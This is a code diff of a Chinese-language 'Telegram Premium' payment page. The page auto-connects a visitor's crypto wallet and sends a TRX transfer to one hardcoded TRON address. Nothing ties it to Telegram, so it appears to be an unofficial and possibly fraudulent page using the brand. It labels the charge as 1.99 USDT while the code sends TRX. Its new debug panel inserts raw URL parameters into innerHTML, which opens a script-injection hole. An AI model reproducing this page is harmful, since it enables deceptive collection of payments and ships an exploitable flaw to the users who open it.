@@ -3,26 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram Premium 支付确认</title>
+    <title>支付确认 - Telegram Premium</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-            -webkit-text-size-adjust: 100%;
-        }
-        
-        html {
-            font-size: 16px;
-        }
-        
-        @media (max-width: 480px) {
-            html { font-size: 14px; }
-        }
-        
-        @media (max-width: 360px) {
-            html { font-size: 13px; }
         }
         
         body {
@@ -30,411 +16,128 @@
             background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             color: white;
             min-height: 100vh;
-            min-height: 100dvh;
             padding: 1rem;
-            line-height: 1.5;
-            overflow-x: hidden;
         }
         
         .container {
-            width: 100%;
             max-width: 28rem;
             margin: 0 auto;
-            padding: 0.5rem;
-        }
-        
-        .header {
-            text-align: center;
-            margin-bottom: 2rem;
-            padding: 0 0.5rem;
-        }
-        
-        .header h1 {
-            font-size: 1.8rem;
-            margin-bottom: 0.5rem;
-            background: linear-gradient(90deg, #ffd700, #ff8c00);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            font-weight: 700;
-        }
-        
-        .header p {
-            font-size: 0.95rem;
-            opacity: 0.9;
         }
         
         .order-card {
             background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
             border-radius: 1.25rem;
             padding: 1.5rem;
-            margin: 0 auto;
-            box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            text-align: center;
-        }
-        
-        .order-header {
-            margin-bottom: 1.5rem;
-        }
-        
-        .order-header h2 {
-            font-size: 1.4rem;
-            margin-bottom: 0.5rem;
-            color: #ffd700;
-            font-weight: 600;
-        }
-        
-        .order-info {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 0.75rem;
-            padding: 1.25rem;
-            margin-bottom: 1.5rem;
-            text-align: left;
-        }
-        
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 0.75rem;
-            padding-bottom: 0.75rem;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .info-row:last-child {
-            margin-bottom: 0;
-            padding-bottom: 0;
-            border-bottom: none;
-        }
-        
-        .info-label {
-            font-weight: 500;
-            opacity: 0.9;
-        }
-        
-        .info-value {
-            font-weight: 600;
-            color: #ffd700;
-        }
-        
-        .payment-info {
-            background: rgba(33, 150, 243, 0.2);
-            border: 1px solid #2196F3;
-            border-radius: 0.75rem;
-            padding: 1.25rem;
-            margin-bottom: 1.5rem;
-            text-align: left;
-        }
-        
-        .payment-info h3 {
-            font-size: 1.1rem;
             margin-bottom: 1rem;
-            color: #2196F3;
-            text-align: center;
-        }
-        
-        .payment-detail {
-            margin-bottom: 0.5rem;
-        }
-        
-        .payment-detail:last-child {
-            margin-bottom: 0;
         }
         
         .btn {
-            display: inline-block;
-            background: linear-gradient(90deg, #ff8c00, #ffd700);
-            color: #1e3c72;
+            background: linear-gradient(90deg, #4CAF50, #45a049);
+            color: white;
             padding: 1rem 1.5rem;
             border-radius: 3rem;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 1.1rem;
-            transition: all 0.3s ease;
-            box-shadow: 0 0.25rem 1rem rgba(255, 140, 0, 0.4);
             border: none;
             cursor: pointer;
             width: 100%;
-            margin-bottom: 1rem;
-            touch-action: manipulation;
-            min-height: 3.5rem;
+            font-size: 1.1rem;
+            font-weight: 600;
         }
         
-        .btn:active {
-            transform: translateY(1px);
-            box-shadow: 0 0.125rem 0.5rem rgba(255, 140, 0, 0.4);
-        }
-        
-        .btn-pay {
-            background: linear-gradient(90deg, #4CAF50, #45a049);
-            font-size: 1.2rem;
-            font-weight: 700;
-        }
-        
-        .success-message {
-            background: rgba(76, 175, 80, 0.2);
-            border: 1px solid #4CAF50;
-            border-radius: 0.75rem;
-            padding: 1.5rem;
-            margin: 1rem 0;
-            text-align: center;
-            display: none;
-        }
-        
-        .wallet-status {
-            background: rgba(255, 215, 0, 0.2);
-            border: 1px solid #ffd700;
-            border-radius: 0.75rem;
+        .debug-info {
+            background: rgba(0,0,0,0.3);
             padding: 1rem;
-            margin: 1rem 0;
-            text-align: center;
-            display: none;
-        }
-        
-        .status-connected {
-            background: rgba(76, 175, 80, 0.2);
-            border-color: #4CAF50;
-        }
-        
-        .error-message {
-            background: rgba(244, 67, 54, 0.2);
-            border: 1px solid #f44336;
             border-radius: 0.75rem;
-            padding: 1rem;
-            margin: 1rem 0;
-            text-align: center;
-            display: none;
-        }
-
-        .instructions {
-            background: rgba(255, 215, 0, 0.2);
-            border: 1px solid #ffd700;
-            border-radius: 0.75rem;
-            padding: 1rem;
-            margin: 1rem 0;
-            font-size: 0.85rem;
-            text-align: center;
-            line-height: 1.4;
+            font-size: 0.8rem;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>Telegram Premium 支付确认</h1>
-            <p>请在钱包内确认支付信息</p>
-        </div>
-        
         <div class="order-card">
-            <div class="order-header">
-                <h2>订单信息</h2>
+            <h2>支付确认</h2>
+            <div id="orderInfo">
+                <p>用户名: <span id="username">-</span></p>
+                <p>昵称: <span id="nickname">-</span></p>
+                <p>金额: $<span id="amount">1.99</span></p>
             </div>
             
-            <!-- 错误信息 -->
-            <div id="errorMessage" class="error-message" style="display: none;">
-                <h3>❌ 订单数据不存在</h3>
-                <p id="errorText">请返回首页重新下单</p>
-                <button onclick="goBack()" class="btn" style="margin-top: 1rem;">返回首页</button>
+            <div id="paymentInfo">
+                <p>收款地址: TCSmW3PZTPaog8d2CKBstcFNcGGtyf9Jub</p>
+                <p>网络: TRON (TRC20)</p>
             </div>
             
-            <div id="orderContent" style="display: none;">
-                <div class="order-info">
-                    <div class="info-row">
-                        <span class="info-label">订单名称:</span>
-                        <span class="info-value">Telegram Premium 订阅</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">订单号:</span>
-                        <span class="info-value" id="orderId">-</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Telegram 用户名:</span>
-                        <span class="info-value" id="username">-</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">用户昵称:</span>
-                        <span class="info-value" id="nickname">-</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">支付金额:</span>
-                        <span class="info-value" id="amount">-</span>
-                    </div>
-                </div>
-                
-                <div class="payment-info">
-                    <h3>💳 支付信息</h3>
-                    <div class="payment-detail">
-                        <strong>金额:</strong> <span id="paymentAmount">1.99 USDT</span>
-                    </div>
-                    <div class="payment-detail">
-                        <strong>收款地址:</strong> TCSmW3PZTPaog8d2CKBstcFNcGGtyf9Jub
-                    </div>
-                    <div class="payment-detail">
-                        <strong>网络:</strong> TRON (TRC20)
-                    </div>
-                    <div class="payment-detail">
-                        <strong>Gas 费用:</strong> 约 0.1 TRX
-                    </div>
-                </div>
+            <button id="payBtn" class="btn" onclick="processPayment()">确认支付</button>
+            <div id="paymentStatus"></div>
+        </div>
 
-                <div class="instructions">
-                    <h4>💰 支付指导</h4>
-                    <p>点击"确认支付"后，钱包会弹出交易确认窗口</p>
-                    <p>请仔细核对支付信息并在钱包中确认交易</p>
-                </div>
-                
-                <!-- 钱包连接状态 -->
-                <div id="walletStatus" class="wallet-status">
-                    <h3>🔗 钱包连接状态</h3>
-                    <p id="walletAddress">正在检测钱包环境...</p>
-                </div>
-                
-                <button id="payBtn" class="btn btn-pay">确认支付 1.99 USDT</button>
-                
-                <!-- 支付成功 -->
-                <div id="successMessage" class="success-message" style="display: none;">
-                    <h3>🎉 支付成功！</h3>
-                    <p>您的 Telegram Premium 订阅正在处理中</p>
-                    <p>我们将在5分钟内激活您的订阅</p>
-                </div>
-            </div>
+        <div class="debug-info">
+            <div id="debugContent"></div>
         </div>
     </div>
 
     <script>
-        let userAccount;
-        let orderData = {};
+        let walletType = '';
+        let deviceType = '';
+        let userAccount = null;
 
-        // 返回首页
-        function goBack() {
-            window.location.href = './index.html';
+        // 检测钱包类型和设备
+        function detectWalletAndDevice() {
+            const ua = navigator.userAgent.toLowerCase();
+            
+            if (ua.includes('tokenpocket')) walletType = "TokenPocket";
+            else if (ua.includes('imtoken')) walletType = "imToken";
+            else if (ua.includes('metamask')) walletType = "MetaMask";
+            else if (ua.includes('bitkeep') || ua.includes('bitget')) walletType = "Bitget";
+            else walletType = "未知钱包";
+            
+            if (/iphone|ipad|ipod/.test(ua)) deviceType = "iOS";
+            else if (/android/.test(ua)) deviceType = "Android";
+            else deviceType = "其他设备";
+            
+            document.getElementById('debugContent').innerHTML = `
+                钱包: ${walletType} | 设备: ${deviceType}<br>
+                URL参数: ${window.location.search}
+            `;
         }
 
-        // 从localStorage获取订单数据
-        function getOrderData() {
-            try {
-                const storedData = localStorage.getItem('telegram_premium_order');
-                
-                if (!storedData) {
-                    console.error('未找到订单数据');
-                    return null;
-                }
-                
-                const orderData = JSON.parse(storedData);
-                console.log('从localStorage获取订单数据:', orderData);
-                
-                // 检查数据是否过期（10分钟）
-                const tenMinutes = 10 * 60 * 1000;
-                if (Date.now() - orderData.timestamp > tenMinutes) {
-                    localStorage.removeItem('telegram_premium_order');
-                    console.error('订单数据已过期');
-                    return null;
-                }
-                
-                return orderData;
-            } catch (error) {
-                console.error('解析订单数据失败:', error);
-                return null;
-            }
-        }
-
-        // 显示订单信息
-        function displayOrderInfo(data) {
-            // 生成订单号
-            const orderId = 'TG' + Date.now();
-            
-            document.getElementById('orderId').textContent = orderId;
-            document.getElementById('username').textContent = data.username;
-            document.getElementById('nickname').textContent = data.nickname;
-            document.getElementById('amount').textContent = '$' + data.amount;
-            document.getElementById('paymentAmount').textContent = data.amount + ' USDT';
-            
-            // 显示订单内容
-            document.getElementById('orderContent').style.display = 'block';
-        }
-
-        // 初始化
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('开始加载订单页面...');
-            
-            // 从localStorage获取订单数据
-            const storedOrderData = getOrderData();
-            
-            if (!storedOrderData) {
-                showError('订单数据不存在或已过期，请返回重新下单');
-                return;
-            }
-            
-            orderData = storedOrderData;
-            
-            // 显示订单信息
-            displayOrderInfo(orderData);
-            
-            // 自动检测钱包环境
-            checkWalletEnvironment();
-            
-            // 支付按钮
-            document.getElementById('payBtn').addEventListener('click', processPayment);
-            
-            console.log('订单页面加载完成');
-        });
-
-        // 检测钱包环境
-        function checkWalletEnvironment() {
-            console.log('检测钱包环境...');
-            
+        // 自动连接钱包
+        function autoConnectWallet() {
             if (window.ethereum || window.tronWeb) {
-                console.log('检测到钱包DApp环境');
-                document.getElementById('walletStatus').classList.add('status-connected');
-                
-                if (window.ethereum) {
-                    document.getElementById('walletAddress').textContent = '✅ 已连接 Ethereum 钱包';
-                    getEthereumAccount();
-                } else if (window.tronWeb) {
-                    document.getElementById('walletAddress').textContent = '✅ 已连接 TronLink 钱包';
-                    getTronAccount();
-                }
+                connectWallet();
             } else {
-                console.log('未检测到钱包DApp环境');
-                document.getElementById('walletAddress').textContent = '⚠️ 请在钱包DApp浏览器中打开此页面';
+                setTimeout(autoConnectWallet, 500);
             }
         }
 
-        // 获取Ethereum账户
-        async function getEthereumAccount() {
+        // 连接钱包
+        async function connectWallet() {
             try {
-                const accounts = await window.ethereum.request({
-                    method: 'eth_requestAccounts'
-                });
-                
-                if (accounts && accounts.length > 0) {
-                    userAccount = accounts[0];
-                    const shortAddress = `${userAccount.substring(0, 8)}...${userAccount.substring(userAccount.length - 6)}`;
-                    document.getElementById('walletAddress').textContent = `✅ 已连接 Ethereum 钱包\n地址: ${shortAddress}`;
+                if (window.tronWeb) {
+                    // TronLink 钱包
+                    let retryCount = 0;
+                    const checkTronLink = setInterval(() => {
+                        if (window.tronWeb && window.tronWeb.defaultAddress) {
+                            clearInterval(checkTronLink);
+                            userAccount = window.tronWeb.defaultAddress.base58;
+                            document.getElementById('debugContent').innerHTML += `<br>已连接: ${userAccount}`;
+                        } else if (retryCount >= 10) {
+                            clearInterval(checkTronLink);
+                        }
+                        retryCount++;
+                    }, 500);
+                } else if (window.ethereum) {
+                    // Ethereum 钱包
+                    const accounts = await window.ethereum.request({
+                        method: 'eth_requestAccounts'
+                    });
+                    if (accounts.length > 0) {
+                        userAccount = accounts[0];
+                        document.getElementById('debugContent').innerHTML += `<br>已连接: ${userAccount}`;
+                    }
                 }
             } catch (error) {
-                console.error('获取Ethereum账户失败:', error);
+                console.error('连接钱包失败:', error);
             }
-        }
-
-        // 获取Tron账户
-        async function getTronAccount() {
-            try {
-                if (window.tronWeb && window.tronWeb.defaultAddress) {
-                    userAccount = window.tronWeb.defaultAddress.base58;
-                    const shortAddress = `${userAccount.substring(0, 8)}...${userAccount.substring(userAccount.length - 6)}`;
-                    document.getElementById('walletAddress').textContent = `✅ 已连接 TronLink 钱包\n地址: ${shortAddress}`;
-                }
-            } catch (error) {
-                console.error('获取Tron账户失败:', error);
-            }
-        }
-
-        // 显示错误信息
-        function showError(message) {
-            document.getElementById('errorMessage').style.display = 'block';
-            document.getElementById('errorText').textContent = message;
         }
 
         // 处理支付
@@ -445,73 +148,48 @@
             }
 
             try {
-                document.getElementById('payBtn').textContent = '支付中...';
                 document.getElementById('payBtn').disabled = true;
+                document.getElementById('payBtn').textContent = '支付中...';
 
                 if (window.tronWeb) {
-                    // 使用TronLink发送TRX交易
-                    await sendTronTransaction();
-                } else if (window.ethereum) {
-                    // 对于Ethereum钱包，提示使用TronLink
-                    alert('当前仅支持TRON网络支付，请使用TronLink钱包');
-                    resetPayButton();
-                    return;
-                } else {
-                    alert('未检测到支持的钱包');
-                    resetPayButton();
-                    return;
-                }
-            } catch (error) {
-                console.error('支付失败:', error);
-                alert('支付失败: ' + error.message);
-                resetPayButton();
-            }
-        }
-
-        // 重置支付按钮
-        function resetPayButton() {
-            document.getElementById('payBtn').textContent = '确认支付 1.99 USDT';
-            document.getElementById('payBtn').disabled = false;
-        }
-
-        // 发送TRON交易
-        async function sendTronTransaction() {
-            try {
-                // 构建TRX转账交易
-                const transaction = await window.tronWeb.transactionBuilder.sendTrx(
-                    'TCSmW3PZTPaog8d2CKBstcFNcGGtyf9Jub', // 收款地址
-                    1990000, // 1.99 TRX (6位小数)
-                    userAccount // 发送方地址
-                );
-                
-                console.log('交易构建成功');
-                
-                // 签名交易 - 这会触发钱包的原生确认界面
-                const signedTransaction = await window.tronWeb.trx.sign(transaction);
-                
-                console.log('交易签名成功');
-                
-                // 广播交易
-                const result = await window.tronWeb.trx.sendRawTransaction(signedTransaction);
-                
-                console.log('交易广播结果:', result);
-                
-                if (result.result) {
-                    // 显示支付成功
-                    document.getElementById('payBtn').style.display = 'none';
-                    document.getElementById('successMessage').style.display = 'block';
+                    const transaction = await window.tronWeb.transactionBuilder.sendTrx(
+                        'TCSmW3PZTPaog8d2CKBstcFNcGGtyf9Jub',
+                        1990000, // 1.99 USDT
+                        userAccount
+                    );
                     
-                    // 清理localStorage
-                    localStorage.removeItem('telegram_premium_order');
+                    const signedTransaction = await window.tronWeb.trx.sign(transaction);
+                    const result = await window.tronWeb.trx.sendRawTransaction(signedTransaction);
+                    
+                    document.getElementById('paymentStatus').innerHTML = '<p style="color: #4CAF50;">支付成功！</p>';
                 } else {
-                    throw new Error('交易失败: ' + (result.message || '未知错误'));
+                    alert('请使用TronLink钱包');
                 }
-                
             } catch (error) {
-                console.error('TRON交易失败:', error);
-                throw error;
+                document.getElementById('paymentStatus').innerHTML = `<p style="color: #f44336;">支付失败: ${error.message}</p>`;
+                document.getElementById('payBtn').disabled = false;
+                document.getElementById('payBtn').textContent = '确认支付';
             }
         }
+
+        // 初始化
+        document.addEventListener('DOMContentLoaded', function() {
+            detectWalletAndDevice();
+            
+            // 获取URL参数
+            const urlParams = new URLSearchParams(window.location.search);
+            const username = urlParams.get('username') || urlParams.get('u');
+            const nickname = urlParams.get('nickname') || urlParams.get('n');
+            
+            if (username && nickname) {
+                document.getElementById('username').textContent = decodeURIComponent(username);
+                document.getElementById('nickname').textContent = decodeURIComponent(nickname);
+                // 自动连接钱包
+                autoConnectWallet();
+            } else {
+                document.getElementById('paymentStatus').innerHTML = '<p style="color: #f44336;">参数错误，请返回重试</p>';
+            }
+        });
     </script>
 </body>
 </html>
